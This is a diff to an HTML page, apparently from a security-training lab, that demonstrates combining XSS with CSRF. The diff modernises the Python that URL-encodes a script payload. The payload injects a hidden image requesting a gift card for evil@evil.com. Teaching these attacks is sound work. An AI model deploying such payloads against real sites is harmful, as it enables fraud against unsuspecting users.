@@ -54,14 +54,16 @@ y%27%2C%20%27none%27%29%3B%20%20%20%20%20document.body.appendChild%28i%29%3B%22"
 <p>This querystring was created using interactive Python:</p>
 
 <code>
-    import urllib<br>
+    from urllib.parse import quote<br>
     url = '/csrf/gift-card?email=evil@evil.com&amp;amount=100'<br>
     js = '''";var i=document.createElement('img');''' +\<br>
     &nbsp;&nbsp;&nbsp;&nbsp;'''i.src=%r;''' +\<br>
     &nbsp;&nbsp;&nbsp;&nbsp;'''i.setAttribute('display', 'none');''' +\<br>
     &nbsp;&nbsp;&nbsp;&nbsp;'''document.body.appendChild(i);"'''<br>
-    urllib.quote(js % url)
+    quote(js % url)
 </code>
+
+<p>For Python 2, change the first line to read: <code>from urllib import quote</code>.</p>
 
 <p>In this example we've combined and XSS exploit with a CSRF exploit. This way the domain name on the
     link is familiar to the user. It is also possible to embed images on different sites or within email
